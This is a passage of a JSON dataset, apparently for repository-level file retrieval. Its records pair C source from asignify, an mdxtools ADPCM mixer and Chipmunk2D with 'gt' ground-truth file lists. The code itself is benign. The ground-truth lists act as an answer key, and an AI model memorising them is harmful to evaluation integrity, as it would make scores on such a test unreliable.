xfopen(const char *fname, const char *mode);\nint xopen(const char *fname, int oflags, mode_t mode);\nvoid * xmalloc(size_t len);\nvoid * xmalloc_aligned(size_t align, size_t len);\nvoid * xmalloc0(size_t len);\nchar * xstrdup(const char *str);\n\nint b64_pton(char const *src, unsigned char *target, size_t targsize);\nint b64_pton_stop(char const *src, unsigned char *target, size_t targsize, const char *stop);\nint b64_ntop(unsigned char *src, size_t srclength, char *target,\n\tsize_t targsize);\n\nint hex2bin(unsigned char * const bin, const size_t bin_maxlen,\n    const char * const hex, const size_t hex_len,\n    size_t * const bin_len, const char ** const hex_end);\nchar * bin2hex(char * const hex, const size_t hex_maxlen,\n\tconst unsigned char * const bin, const size_t bin_len);\n\nenum asignify_error {\n\tASIGNIFY_ERROR_OK = 0,\n\tASIGNIFY_ERROR_NO_PUBKEY,\n\tASIGNIFY_ERROR_FILE,\n\tASIGNIFY_ERROR_FORMAT,\n\tASIGNIFY_ERROR_DECRYPT,\n\tASIGNIFY_ERROR_PASSWORD,\n\tASIGNIFY_ERROR_VERIFY,\n\tASIGNIFY_ERROR_SIZE,\n\tASIGNIFY_ERROR_VERIFY_SIZE,\n\tASIGNIFY_ERROR_VERIFY_DIGEST,\n\tASIGNIFY_ERROR_NO_DIGEST,\n\tASIGNIFY_ERROR_MISUSE,\n\tASIGNIFY_ERROR_WRONG_KEYPAIR,\n\tASIGNIFY_ERROR_WRONG_KEY,\n\tASIGNIFY_ERROR_MAX\n};\n\n#define CTX_MAYBE_SET_ERR(ctx, err) do { \\\n\tif ((ctx) != NULL) {\t\\\n\t\t(ctx)->error = xerr_string((err)); \\\n\t}\t\\\n} while(0)\n\nconst char * xerr_string(enum asignify_error code);\n\n\nvoid asignify_alloc_public_data_fields(struct asignify_public_data *pk);\nstruct asignify_public_data* asignify_public_data_load(const char *buf,\n\tsize_t buflen, const char *magic,\n\tsize_t magiclen, unsigned int ver_min, unsigned int ver_max,\n\tunsigned int id_len, unsigned int data_len);\nvoid asignify_public_data_free(struct asignify_public_data *d);\n\n\nstruct asignify_private_data* asignify_private_data_load(FILE *f, int *error,\n\tasignify_password_cb password_cb, void *d);\nvoid asignify_private_data_free(struct asignify_private_data *d);\nbool asignify_privkey_write(struct asignify_private_key *privk, FILE *f);\nstruct asignify_public_data* asignify_private_data_sign(\n\tstruct asignify_private_data *privk, unsigned char *buf, size_t len);\n\n\nstruct asignify_public_data* asignify_pubkey_load(FILE *f);\nbool asignify_pubkey_check_signature(struct asignify_public_data *pk,\n\tstruct asignify_public_data *sig, const unsigned char *data, size_t dlen);\nbool asignify_pubkey_write(struct asignify_public_data *pk, FILE *f);\n\n\nstruct asignify_public_data* asignify_signature_load(FILE *f,\n\t\tstruct asignify_public_data *pk);\nbool asignify_signature_write(struct asignify_public_data *sig, const void *buf,\n\tsize_t len, FILE *f);\n\n\nconst unsigned char * asignify_ssh_read_string(const unsigned char *buf,\n\t\tunsigned int *str_len, unsigned int remain, unsigned char const **npos);\nstruct asignify_private_data* asignify_ssh_privkey_load(FILE *f, int *error);\n\n#endif\n",
        "gt": [
            "'asignify/include/asignify.h'",
            "'asignify/libasignify/asignify_internal.h'",
            "'asignify/libasignify/chacha.c'"
        ]
    },
    {
        "files": [
            "'mdxtools/adpcm.h'",
            "'mdxtools/adpcm_pcm_mix_driver.h'",
            "'mdxtools/adpcm_pcm_mix_driver.c'"
        ],
        "content": "'mdxtools/adpcm.h'\n:struct adpcm_status {\n\tshort last;\n\tshort step_index;\n};\n\nvoid adpcm_init(struct adpcm_status *);\nchar adpcm_encode( short, struct adpcm_status *);\nshort adpcm_decode( char, struct adpcm_status *);\n\n'mdxtools/adpcm_pcm_mix_driver.h'\n:#ifndef ADPCM_PCM_MIX_DRIVER_H_\n#define ADPCM_PCM_MIX_DRIVER_H_\n\n#include \"adpcm_driver.h\"\n#include \"adpcm.h\"\n#include \"mamedef.h\"\n#include \"speex_resampler.h\"\n#include \"fixed_resampler.h\"\n\nstruct adpcm_mix_driver_channel {\n\n\n\n\n\n\tint freq_num;\n\tint volume;\n\n\tstruct adpcm_status decoder_status;\n\tuint8_t *data;\n\tint data_len;\n\tint data_pos;\n\tint nybble;\n};\n\nstruct adpcm_pcm_mix_driver {\n\tstruct adpcm_driver adpcm_driver;\n\n\tstruct adpcm_mix_driver_channel channels[8];\n\tstruct fixed_resampler resamplers[4];\n\tstruct adpcm_status encoder_status;\n\n\tstream_sample_t *decode_buf, *decode_resample_buf, *mix_buf_l, *mix_buf_r;\n\tint buf_size;\n\n\tSpeexResamplerState *output_resampler;\n};\nint adpcm_pcm_mix_driver_init(struct adpcm_pcm_mix_driver *driver, int sample_rate, int buf_size);\nvoid adpcm_pcm_mix_driver_deinit(struct adpcm_pcm_mix_driver *driver);\nint adpcm_pcm_mix_driver_estimate(struct adpcm_pcm_mix_driver *driver, int buf_size);\nint adpcm_pcm_mix_driver_run(struct adpcm_pcm_mix_driver *driver, stream_sample_t *buf_l, stream_sample_t *buf_r, int buf_size);\n\n#endif\n\n'mdxtools/adpcm_pcm_mix_driver.c'\n:#include <string.h>\n\n#include \"adpcm_pcm_mix_driver.h\"\n#include \"speex_resampler.h\"\n#include \"fixed_resampler.h\"\n#include \"mamedef.h\"\n\n\n\n\n\n\n\n\n\nstream_sample_t sinctbl4[] = {\n#include \"sinctbl4.h\"\n};\n\nstream_sample_t sinctbl3[] = {\n#include \"sinctbl3.h\"\n};\n\nstatic uint16_t adpcm_mixer_calc_vol(uint8_t vol) {\n\tconst uint8_t vol_00_0f[] = {\n\t\t0x6B, 0x6F, 0x71, 0x74, 0x76, 0x79, 0x7B, 0x7D,\n\t\t0x80, 0x82, 0x84, 0x87, 0x8A, 0x8C, 0x8F, 0x91,\n\t};\n\tconst uint16_t vol_40_a0[] = {\n\t\t5, 6, 6, 7, 7, 8, 9, 10, 10, 11, 12, 14, 15, 16, 18, 20, 21,\n\t\t23, 25, 29, 31, 33, 37, 41, 46, 50, 54, 60, 66, 72, 80, 89,\n\t\t97, 107, 117, 130, 142, 156, 173, 189, 205, 226, 246, 267,\n\t\t308, 328, 369, 410, 431, 492, 533, 594, 656, 717, 799, 861,\n\t\t963, 1045, 1147, 1270, 1393, 1536, 1700, 1864, 2048, 2253,\n\t\t2479, 2724, 2991, 3298, 3625, 3994, 4383, 4834, 5325, 5837,\n\t\t6431, 7087, 7783, 8561, 9442, 10363, 11387, 12555, 13824,\n\t\t15217, 16733, 18371, 20255, 22221, 24454, 26932, 29696,\n\t\t32768, 36127, 39732, 43541\n\t};\n\n\tif(vol <= 15)\n\t\treturn vol_40_a0[vol_00_0f[vol] - 0x40];\n\tif(vol >= 0x40 && vol <= 0xa0)\n\t\treturn vol_40_a0[vol - 0x40];\n\n\treturn 0;\n}\n\nstatic int adpcm_mix_driver_channel_set_volume(struct adpcm_mix_driver_channel *chan, uint8_t volume) {\n\tchan->volume = adpcm_mixer_calc_vol(volume);\n\n\treturn 0;\n}\n\nstatic int adpcm_mix_driver_channel_init(struct adpcm_mix_driver_channel *channel) {\n\tchannel->data = NULL;\n\tchannel->data_len = 0;\n\tadpcm_init(&channel->decoder_status);\n\tadpcm_mix_driver_channel_set_volume(channel, 15);\n\n\treturn 0;\n}\n\nstatic void adpcm_mix_driver_channel_deinit(struct adpcm_mix_driver_channel *channel) {\n\tchannel->data = NULL;\n\tchannel->data_len = 0;\n}\n\nstatic int adpcm_mix_driver_channel_is_active(struct adpcm_mix_driver_channel *channel) {\n\treturn channel->data && channel->data_pos < channel->data_len;\n}\n\nstatic stream_sample_t adpcm_mix_driver_channel_get_sample(struct adpcm_mix_driver_channel *channel) {\n\tif(!adpcm_mix_driver_channel_is_active(channel))\n\t\treturn 0;\n\n\tuint8_t b = channel->data[channel->data_pos];\n\tif(channel->nybble) {\n\t\tb >>= 4;\n\t} else {\n\t\tb &= 0x0f;\n\t}\n\n\tstream_sample_t sample = adpcm_decode(b, &channel->decoder_status);\n\tsample = channel->volume * sample / 1024;\n\tif(sample > 32767) sample = 32767;\n\tif(sample < -32767) sample = -32767;\n\n\tif(channel->nybble) {\n\t\tchannel->data_pos++;\n\t\tchannel->nybble = 0;\n\t} else {\n\t\tchannel->nybble = 1;\n\t}\n\n\treturn sample;\n}\n\nstatic int adpcm_mix_driver_channel_play(struct adpcm_mix_driver_channel *channel, uint8_t *data, int data_len, uint8_t freq_num, uint8_t volume) {\n\tadpcm_init(&channel->decoder_status);\n\n\tchannel->data = data;\n\tchannel->data_len = data_len;\n\tchannel->freq_num = freq_num;\n\tadpcm_mix_driver_channel_set_volume(channel, volume);\n\n\tchannel->data_pos = 0;\n\tchannel->nybble = 0;\n\n\treturn 0;\n}\n\nstatic int adpcm_mix_driver_channel_stop(struct adpcm_mix_driver_channel *chan) {\n\tchan->data = 0;\n\tchan->data_len = 0;\n\tchan->volume = 0;\n\tchan->data_pos = 0;\n\tchan->nybble = 0;\n\n\treturn 0;\n}\n\nstatic int adpcm_mix_driver_channel_set_freq(struct adpcm_mix_driver_channel *chan, uint8_t freq_num) {\n\tchan->freq_num = freq_num;\n\n\treturn 0;\n}\n\nstatic int adpcm_pcm_mix_driver_alloc_buffers(struct adpcm_pcm_mix_driver *driver, int buf_size) {\n\tif(driver->buf_size != buf_size) {\n\t\tdriver->buf_size = buf_size;\n\n\t\tdriver->decode_buf = realloc(driver->decode_buf, driver->buf_size * sizeof(*driver->decode_buf));\n\t\tdriver->decode_resample_buf = realloc(driver->decode_resample_buf, driver->buf_size * sizeof(*driver->decode_resample_buf));\n\t\tdriver->mix_buf_l = realloc(driver->mix_buf_l, driver->buf_size * sizeof(*driver->mix_buf_l));\n\t\tdriver->mix_buf_r = realloc(driver->mix_buf_r, driver->buf_size * sizeof(*driver->mix_buf_r));\n\t\tif(!driver->decode_buf || !driver->decode_resample_buf || !driver->mix_buf_l || !driver->mix_buf_r)\n\t\t\treturn 1;\n\t}\n\n\treturn 0;\n}\n\nstatic int adpcm_pcm_mix_driver_play(struct adpcm_driver *driver, uint8_t channel, uint8_t *data, int data_len, uint8_t freq_num, uint8_t volume) {\n\tstruct adpcm_pcm_mix_driver *pdrv = (struct adpcm_pcm_mix_driver *)driver;\n\treturn adpcm_mix_driver_channel_play(&pdrv->channels[channel], data, data_len, freq_num, volume);\n}\n\nstatic int adpcm_pcm_mix_driver_stop(struct adpcm_driver *driver, uint8_t channel) {\n\tstruct adpcm_pcm_mix_driver *pdrv = (struct adpcm_pcm_mix_driver *)driver;\n\treturn adpcm_mix_driver_channel_stop(&pdrv->channels[channel]);\n}\n\nstatic int adpcm_pcm_mix_driver_set_freq(struct adpcm_driver *driver, uint8_t channel, uint8_t freq) {\n\tstruct adpcm_pcm_mix_driver *pdrv = (struct adpcm_pcm_mix_driver *)driver;\n\treturn adpcm_mix_driver_channel_set_freq(&pdrv->channels[channel], freq);\n}\n\nstatic int adpcm_pcm_mix_driver_set_volume(struct adpcm_driver *driver, uint8_t channel, uint8_t vol) {\n\tstruct adpcm_pcm_mix_driver *pdrv = (struct adpcm_pcm_mix_driver *)driver;\n\treturn adpcm_mix_driver_channel_set_volume(&pdrv->channels[channel], vol);\n}\n\nstatic int adpcm_pcm_mix_driver_set_pan(struct adpcm_driver *driver, uint8_t pan) {\n\tdriver->pan = pan & 0x03;\n\treturn 0;\n}\n\nint adpcm_pcm_mix_driver_init(struct adpcm_pcm_mix_driver *driver, int sample_rate, int buf_size) {\n\tadpcm_driver_init(&driver->adpcm_driver);\n\tdriver->adpcm_driver.play = adpcm_pcm_mix_driver_play;\n\tdriver->adpcm_driver.stop = adpcm_pcm_mix_driver_stop;\n\tdriver->adpcm_driver.set_freq = adpcm_pcm_mix_driver_set_freq;\n\tdriver->adpcm_driver.set_volume = adpcm_pcm_mix_driver_set_volume;\n\tdriver->adpcm_driver.set_pan = adpcm_pcm_mix_driver_set_pan;\n\n\tfor(int i = 0; i < 8; i++) {\n\t\tadpcm_mix_driver_channel_init(&driver->channels[i]);\n\t}\n\n\tfixed_resampler_init(&driver->resamplers[0], sinctbl4, 1, 26, 1, 4);\n\tfixed_resampler_init(&driver->resamplers[1], sinctbl3, 1, 26, 1, 3);\n\tfixed_resampler_init(&driver->resamplers[2], sinctbl4, 2, 26, 1, 2);\n\tfixed_resampler_init(&driver->resamplers[3], sinctbl3, 1, 26, 2, 3);\n\n\tadpcm_init(&driver->encoder_status);\n\n\tdriver->buf_size = 0;\n\tdriver->decode_buf = driver->decode_resample_buf = driver->mix_buf_l = driver->mix_buf_r = 0;\n\tadpcm_pcm_mix_driver_alloc_buffers(driver, buf_size);\n\n\tint err = RESAMPLER_ERR_SUCCESS;\n\tdriver->output_resampler = speex_resampler_init(2, 15625, sample_rate, SPEEX_RESAMPLER_QUALITY_DEFAULT, &err);\n\tif(err != RESAMPLER_ERR_SUCCESS || !driver->output_resampler) {\n\t\treturn -1;\n\t}\n\n\treturn 0;\n}\n\nvoid adpcm_pcm_mix_driver_deinit(struct adpcm_pcm_mix_driver *driver) {\n\tspeex_resampler_destroy(driver->output_resampler);\n\tdriver->output_resampler = NULL;\n\n\n\n\tfor(int i = 0; i < 4; i++) {\n\t\tfixed_resampler_deinit(&driver->resamplers[i]);\n\t}\n\n\tfor(int i = 0; i < 8; i++) {\n\t\tadpcm_mix_driver_channel_deinit(&driver->channels[i]);\n\t}\n}\n\nint adpcm_pcm_mix_driver_estimate(struct adpcm_pcm_mix_driver *driver, int buf_size) {\n\tspx_uint32_t in_len = 1, out_len = buf_size;\n\tspeex_resampler_estimate(driver->output_resampler, 0, &in_len, &out_len);\n\treturn out_len;\n}\n\nint adpcm_pcm_mix_driver_run(struct adpcm_pcm_mix_driver *driver, stream_sample_t *buf_l, stream_sample_t *buf_r, int buf_size) {\n\tint r = adpcm_pcm_mix_driver_alloc_buffers(driver, buf_size);\n\tif(r != 0)\n\t\treturn r;\n\n\tspeex_resampler_set_input_stride(driver->output_resampler, 1);\n\tspeex_resampler_set_output_stride(driver->output_resampler, 1);\n\tspx_uint32_t in_len = buf_size, out_len = buf_size;\n\tspeex_resampler_estimate(driver->output_resampler, 0, &in_len, &out_len);\n\n\tmemset(driver->mix_buf_l, 0, in_len * sizeof(*driver->mix_buf_l));\n\tmemset(driver->mix_buf_r, 0, in_len * sizeof(*driver->mix_buf_r));\n\n\tstream_sample_t samp;\n\n\tfor(int i = 0; i < 5; i++) {\n\t\tmemset(driver->decode_buf, 0, in_len * sizeof(*driver->decode_buf));\n\t\tif(i < 4) {\n\t\t\tint estimated_in_len = fixed_resampler_estimate(&driver->resamplers[i], in_len);\n\t\t\tint fixed_in_len = estimated_in_len;\n\t\t\tint fixed_out_len = in_len;\n\t\t\tfor(int j = 0; j < 8; j++) {\n\t\t\t\tstruct adpcm_mix_driver_channel *chan = &driver->channels[j];\n\t\t\t\tif(chan->freq_num != i)\n\t\t\t\t\tcontinue;\n\n\t\t\t\tfor(int k = 0; k < estimated_in_len; k++) {\n\t\t\t\t\tsamp = adpcm_mix_driver_channel_get_sample(chan);\n\t\t\t\t\tdriver->decode_buf[k] += samp;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tfixed_resampler_resample(&driver->resamplers[i], driver->decode_buf, &fixed_in_len, driver->decode_resample_buf, &fixed_out_len);\n\n\t\t\tfor(int k = 0; k < in_len; k++) {\n\t\t\t\tdriver->mix_buf_l[k] += driver->adpcm_driver.pan & 0x01 ? driver->decode_resample_buf[k] : 0;\n\t\t\t\tdriver->mix_buf_r[k] += driver->adpcm_driver.pan & 0x02 ? driver->decode_resample_buf[k] : 0;\n\t\t\t}\n\t\t} else {\n\t\t\tfor(int j = 0; j < 8; j++) {\n\t\t\t\tstruct adpcm_mix_driver_channel *chan = &driver->channels[j];\n\t\t\t\tif(chan->freq_num != i)\n\t\t\t\t\tcontinue;\n\n\t\t\t\tfor(int k = 0; k < in_len; k++) {\n\t\t\t\t\tsamp = adpcm_mix_driver_channel_get_sample(chan);\n\t\t\t\t\tdriver->mix_buf_l[k] += driver->adpcm_driver.pan & 0x01 ? samp : 0;\n\t\t\t\t\tdriver->mix_buf_r[k] += driver->adpcm_driver.pan & 0x02 ? samp : 0;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tspx_uint32_t in_len_l = buf_size;\n\tspx_uint32_t out_len_l = buf_size;\n\tspeex_resampler_process_int(driver->output_resampler, 0, driver->mix_buf_l, &in_len_l, buf_l, &out_len_l);\n\n\tspx_uint32_t in_len_r = buf_size;\n\tspx_uint32_t out_len_r = buf_size;\n\tspeex_resampler_process_int(driver->output_resampler, 1, driver->mix_buf_r, &in_len_r, buf_r, &out_len_r);\n\n\treturn 0;\n}\n",
        "gt": [
            "'mdxtools/adpcm.h'",
            "'mdxtools/adpcm_pcm_mix_driver.h'",
            "'mdxtools/adpcm_pcm_mix_driver.c'"
        ]
    },
    {
        "files": [
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/demo/Chains.c'",
            "'Chipmunk2D/include/chipmunk/cpRotaryLimitJoint.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'"
        ],
        "content": "'Chipmunk2D/include/chipmunk/cpConstraint.h'\n:\n\n\n\n\n\ntypedef void (*cpConstraintPreSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\ntypedef void (*cpConstraintPostSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\n\nCP_EXPORT void cpConstraintDestroy(cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintFree(cpConstraint *constraint);\n\n\nCP_EXPORT cpSpace* cpConstraintGetSpace(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyA(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyB(const cpConstraint *constraint);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxForce(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxForce(cpConstraint *constraint, cpFloat maxForce);\n\n\nCP_EXPORT cpFloat cpConstraintGetErrorBias(const cpConstraint *constraint);\n\n\n\nCP_EXPORT void cpConstraintSetErrorBias(cpConstraint *constraint, cpFloat errorBias);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxBias(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxBias(cpConstraint *constraint, cpFloat maxBias);\n\n\nCP_EXPORT cpBool cpConstraintGetCollideBodies(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetCollideBodies(cpConstraint *constraint, cpBool collideBodies);\n\n\nCP_EXPORT cpConstraintPreSolveFunc cpConstraintGetPreSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPreSolveFunc(cpConstraint *constraint, cpConstraintPreSolveFunc preSolveFunc);\n\n\nCP_EXPORT cpConstraintPostSolveFunc cpConstraintGetPostSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPostSolveFunc(cpConstraint *constraint, cpConstraintPostSolveFunc postSolveFunc);\n\n\nCP_EXPORT cpDataPointer cpConstraintGetUserData(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetUserData(cpConstraint *constraint, cpDataPointer userData);\n\n\nCP_EXPORT cpFloat cpConstraintGetImpulse(cpConstraint *constraint);\n\n#include \"cpPinJoint.h\"\n#include \"cpSlideJoint.h\"\n#include \"cpPivotJoint.h\"\n#include \"cpGrooveJoint.h\"\n#include \"cpDampedSpring.h\"\n#include \"cpDampedRotarySpring.h\"\n#include \"cpRotaryLimitJoint.h\"\n#include \"cpRatchetJoint.h\"\n#include \"cpGearJoint.h\"\n#include \"cpSimpleMotor.h\"\n\n\n\n'Chipmunk2D/demo/Chains.c'\n:\n\n#include \"chipmunk/chipmunk.h\"\n#include \"ChipmunkDemo.h\"\n\n#define CHAIN_COUNT 8\n#define LINK_COUNT 10\n\nstatic void\nBreakablejointPostStepRemove(cpSpace *space, cpConstraint *joint, void *unused)\n{\n\tcpSpaceRemoveConstraint(space, joint);\n\tcpConstraintFree(joint);\n}\n\nstatic void\nBreakableJointPostSolve(cpConstraint *joint, cpSpace *space)\n{\n\tcpFloat dt = cpSpaceGetCurrentTimeStep(space);\n\n\n\tcpFloat force = cpConstraintGetImpulse(joint)/dt;\n\tcpFloat maxForce = cpConstraintGetMaxForce(joint);\n\n\n\tif(force > 0.9*maxForce){\n\t\tcpSpaceAddPostStepCallback(space, (cpPostStepFunc)BreakablejointPostStepRemove, joint, NULL);\n\t}\n}\n\nstatic void\nupdate(cpSpace *space, double dt)\n{\n\tcpSpaceStep(space, dt);\n}\n\nstatic cpSpace *\ninit(void)\n{\n\tcpSpace *space = cpSpaceNew();\n\tcpSpaceSetIterations(space, 30);\n\tcpSpaceSetGravity(space, cpv(0, -100));\n\tcpSpaceSetSleepTimeThreshold(space, 0.5f);\n\n\tcpBody *body, *staticBody = cpSpaceGetStaticBody(space);\n\tcpShape *shape;\n\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,-240), cpv(-320,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(320,-240), cpv(320,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,-240), cpv(320,-240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,240), cpv(320,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tcpFloat mass = 1;\n\tcpFloat width = 20;\n\tcpFloat height = 30;\n\n\tcpFloat spacing = width*0.3;\n\n\n\tfor(int i=0; i<CHAIN_COUNT; i++){\n\t\tcpBody *prev = NULL;\n\n\t\tfor(int j=0; j<LINK_COUNT; j++){\n\t\t\tcpVect pos = cpv(40*(i - (CHAIN_COUNT - 1)/2.0), 240 - (j + 0.5)*height - (j + 1)*spacing);\n\n\t\t\tbody = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForBox(mass, width, height)));\n\t\t\tcpBodySetPosition(body, pos);\n\n\t\t\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(body, cpv(0, (height - width)/2.0), cpv(0, (width - height)/2.0), width/2.0));\n\t\t\tcpShapeSetFriction(shape, 0.8f);\n\n\t\t\tcpFloat breakingForce = 80000;\n\n\t\t\tcpConstraint *constraint = NULL;\n\t\t\tif(prev == NULL){\n\t\t\t\tconstraint = cpSpaceAddConstraint(space, cpSlideJointNew(body, staticBody, cpv(0, height/2), cpv(pos.x, 240), 0, spacing));\n\t\t\t} else {\n\t\t\t\tconstraint = cpSpaceAddConstraint(space, cpSlideJointNew(body, prev, cpv(0, height/2), cpv(0, -height/2), 0, spacing));\n\t\t\t}\n\n\t\t\tcpConstraintSetMaxForce(constraint, breakingForce);\n\t\t\tcpConstraintSetPostSolveFunc(constraint, BreakableJointPostSolve);\n\t\t\tcpConstraintSetCollideBodies(constraint, cpFalse);\n\n\t\t\tprev = body;\n\t\t}\n\t}\n\n\tcpFloat radius = 15.0f;\n\tbody = cpSpaceAddBody(space, cpBodyNew(10.0f, cpMomentForCircle(10.0f, 0.0f, radius, cpvzero)));\n\tcpBodySetPosition(body, cpv(0, -240 + radius+5));\n\tcpBodySetVelocity(body, cpv(0, 300));\n\n\tshape = cpSpaceAddShape(space, cpCircleShapeNew(body, radius, cpvzero));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.9f);\n\n\treturn space;\n}\n\nstatic void\ndestroy(cpSpace *space)\n{\n\tChipmunkDemoFreeSpaceChildren(space);\n\tcpSpaceFree(space);\n}\n\nChipmunkDemo Chains = {\n\t\"Breakable Chains\",\n\t1.0/180.0,\n\tinit,\n\tupdate,\n\tChipmunkDemoDefaultDrawImpl,\n\tdestroy,\n};\n\n'Chipmunk2D/include/chipmunk/cpRotaryLimitJoint.h'\n:\n\n\n\n\n\nCP_EXPORT cpBool cpConstraintIsRotaryLimitJoint(const cpConstraint *constraint);\n\n\nCP_EXPORT cpRotaryLimitJoint* cpRotaryLimitJointAlloc(void);\n\nCP_EXPORT cpRotaryLimitJoint* cpRotaryLimitJointInit(cpRotaryLimitJoint *joint, cpBody *a, cpBody *b, cpFloat min, cpFloat max);\n\nCP_EXPORT cpConstraint* cpRotaryLimitJointNew(cpBody *a, cpBody *b, cpFloat min, cpFloat max);\n\n\nCP_EXPORT cpFloat cpRotaryLimitJointGetMin(const cpConstraint *constraint);\n\nCP_EXPORT void cpRotaryLimitJointSetMin(cpConstraint *constraint, cpFloat min);\n\n\nCP_EXPORT cpFloat cpRotaryLimitJointGetMax(const cpConstraint *constraint);\n\nCP_EXPORT void cpRotaryLimitJointSetMax(cpConstraint *constraint, cpFloat max);\n\n\n\n'Chipmunk2D/include/chipmunk/chipmunk.h'\n:\n\n#ifndef CHIPMUNK_H\n#define CHIPMUNK_H\n\n#include <stdlib.h>\n#include <math.h>\n\n#ifndef alloca\n\t#ifdef _WIN32\n\t\t#include <malloc.h>\n\t#elif defined(__FreeBSD__)\n\n\t#else\n\t\t#include <alloca.h>\n\t#endif\n#endif\n\n#ifdef _WIN32\n\t#define CP_EXPORT __declspec(dllexport)\n#else\n\t#define CP_EXPORT\n#endif\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nCP_EXPORT void cpMessage(const char *condition, const char *file, int line, int isError, int isHardError, const char *message, ...);\n#ifdef NDEBUG\n\t#define\tcpAssertWarn(__condition__, ...)\n\t#define\tcpAssertSoft(__condition__, ...)\n#else\n\t#define cpAssertSoft(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 0, __VA_ARGS__); abort();}\n\t#define cpAssertWarn(__condition__, ...) if(!(__condition__)) cpMessage(#__condition__, __FILE__, __LINE__, 0, 0, __VA_ARGS__)\n#endif\n\n\n#define cpAssertHard(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 1, __VA_ARGS__); abort();}\n\n#include \"chipmunk_types.h\"\n\n\n\n\n\n#ifndef CP_BUFFER_BYTES\n\t#define CP_BUFFER_BYTES (32*1024)\n#endif\n\n#ifndef cpcalloc\n\n\t#define cpcalloc calloc\n#endif\n\n#ifndef cprealloc\n\n\t#define cprealloc realloc\n#endif\n\n#ifndef cpfree\n\n\t#define cpfree free\n#endif\n\ntypedef struct cpArray cpArray;\ntypedef struct cpHashSet cpHashSet;\n\ntypedef struct cpBody cpBody;\n\ntypedef struct cpShape cpShape;\ntypedef struct cpCircleShape cpCircleShape;\ntypedef struct cpSegmentShape cpSegmentShape;\ntypedef struct cpPolyShape cpPolyShape;\n\ntypedef struct cpConstraint cpConstraint;\ntypedef struct cpPinJoint cpPinJoint;\ntypedef struct cpSlideJoint cpSlideJoint;\ntypedef struct cpPivotJoint cpPivotJoint;\ntypedef struct cpGrooveJoint cpGrooveJoint;\ntypedef struct cpDampedSpring cpDampedSpring;\ntypedef struct cpDampedRotarySpring cpDampedRotarySpring;\ntypedef struct cpRotaryLimitJoint cpRotaryLimitJoint;\ntypedef struct cpRatchetJoint cpRatchetJoint;\ntypedef struct cpGearJoint cpGearJoint;\ntypedef struct cpSimpleMotorJoint cpSimpleMotorJoint;\n\ntypedef struct cpCollisionHandler cpCollisionHandler;\ntypedef struct cpContactPointSet cpContactPointSet;\ntypedef struct cpArbiter cpArbiter;\n\ntypedef struct cpSpace cpSpace;\n\n#include \"cpVect.h\"\n#include \"cpBB.h\"\n#include \"cpTransform.h\"\n#include \"cpSpatialIndex.h\"\n\n#include \"cpArbiter.h\"\n\n#include \"cpBody.h\"\n#include \"cpShape.h\"\n#include \"cpPolyShape.h\"\n\n#include \"cpConstraint.h\"\n\n#include \"cpSpace.h\"\n\n\n#define CP_VERSION_MAJOR 7\n#define CP_VERSION_MINOR 0\n#define CP_VERSION_RELEASE 3\n\n\nCP_EXPORT extern const char *cpVersionString;\n\n\n\nCP_EXPORT cpFloat cpMomentForCircle(cpFloat m, cpFloat r1, cpFloat r2, cpVect offset);\n\n\n\nCP_EXPORT cpFloat cpAreaForCircle(cpFloat r1, cpFloat r2);\n\n\n\nCP_EXPORT cpFloat cpMomentForSegment(cpFloat m, cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpAreaForSegment(cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpMomentForPoly(cpFloat m, int count, const cpVect *verts, cpVect offset, cpFloat radius);\n\n\n\nCP_EXPORT cpFloat cpAreaForPoly(const int count, const cpVect *verts, cpFloat radius);\n\n\nCP_EXPORT cpVect cpCentroidForPoly(const int count, const cpVect *verts);\n\n\nCP_EXPORT cpFloat cpMomentForBox(cpFloat m, cpFloat width, cpFloat height);\n\n\nCP_EXPORT cpFloat cpMomentForBox2(cpFloat m, cpBB box);\n\n\n\n\n\nCP_EXPORT int cpConvexHull(int count, const cpVect *verts, cpVect *result, int *first, cpFloat tol);\n\n\n\n\n\n#define CP_CONVEX_HULL(__count__, __verts__, __count_var__, __verts_var__) \\\ncpVect *__verts_var__ = (cpVect 